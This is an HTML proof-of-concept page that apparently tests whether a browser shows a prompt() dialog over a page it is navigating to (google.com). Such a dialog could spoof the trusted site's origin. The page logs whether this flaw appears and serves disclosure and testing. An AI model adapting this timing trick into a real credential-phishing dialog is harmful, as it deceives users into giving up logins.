<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Windows Browser Dialog Timing PoC</title>
</head>
<body style="background:#111;color:#fff;text-align:center;font-family:sans-serif;">
<h3>Windows Browser Dialog Timing PoC</h3>

<button id="start" style="font-size:22px;padding:12px 24px;">Start Test</button>

<pre id="log" style="color:#0f0; text-align:left; margin:20px auto; width:90%; max-width:800px;"></pre>

<script>
const log = msg => {
  document.getElementById("log").textContent += msg + "\n";
  console.log("[PoC]", msg);
};

document.getElementById("start").onclick = () => {
  log("[INFO] User gesture received");

  // 1️⃣ Delayed top-level navigation
  setTimeout(() => {
    log("[INFO] Triggering top-level navigation to google.com...");
    window.location.href = "https://www.google.com";
  }, 1000);

  // 2️⃣ Prompt during navigation window (slightly after nav trigger)
  setTimeout(() => {
    try {
      prompt(
        "fake.google.com\n⚠️ Do not sign into your account",
        ""
      );
      log("[BUG] prompt() shown during navigation ❌");
    } catch (e) {
      log("[OK] prompt() blocked ✔");
    }
  }, 1050);
};
</script>
</body>
</html>
